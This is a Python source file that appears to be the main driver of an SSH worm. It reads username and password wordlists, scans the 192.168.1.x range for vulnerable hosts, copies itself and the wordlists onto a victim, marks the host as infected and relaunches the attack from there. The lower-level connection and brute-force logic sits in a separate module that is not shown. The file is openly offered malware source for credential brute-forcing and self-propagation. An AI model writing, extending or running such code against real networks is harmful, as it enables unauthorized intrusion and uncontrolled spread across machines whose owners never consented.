""" Main program to run an SSH worm. Can use SSHConnetion for basic replication
    and add functionality for other kinds of worms. """
import os
import sys
import argparse
from SSHConnection import SSHConnection

def main():
    """ User must specify the username and password file when they run the worm.
    These files will travel with the worm in its adventure across the network.
    Additionlly, the SSHConnection file will also travel with the worm, joining
    the fellowship of the worms. """
    parser = argparse.ArgumentParser()
    parser.add_argument("usernames", nargs=1, help="File of usernames to try", type=str)
    parser.add_argument("passwords", nargs=1, help="File of passwords to try", type=str)
    args = parser.parse_args()
    username_file = os.path.basename(args.usernames[0])
    password_file = os.path.basename(args.passwords[0])

    #  Create Instance of the SSH class
    worm = SSHConnection()

    # Set locations  to place on victim system
    worm_file = os.path.basename(__file__)
    host_dir = os.path.dirname(__file__)
    if len(host_dir) > 0:
        host_dir = host_dir + "/"
    worm.set_target_dir(host_dir)
    worm.set_host_dir(host_dir)
    # Sets target directory to be same as one as where it was launched
    worm.set_files([worm_file, username_file, password_file])
    worm.retrieve_vulnerable_hosts("192.168.1.", 10)
    # Find a target to infect, checks to make sure target hasn't previously been infected
    if worm.find_target_host():
        # Mark target system
        worm.place_worm()
        # Start attack from new system
        worm.start_attack()
    else:
        with open("/tmp/no_found_hosts.txt", "w") as no_hosts:
            no_hosts.write("no hosts found")
    return

if __name__ == "__main__":
    main()
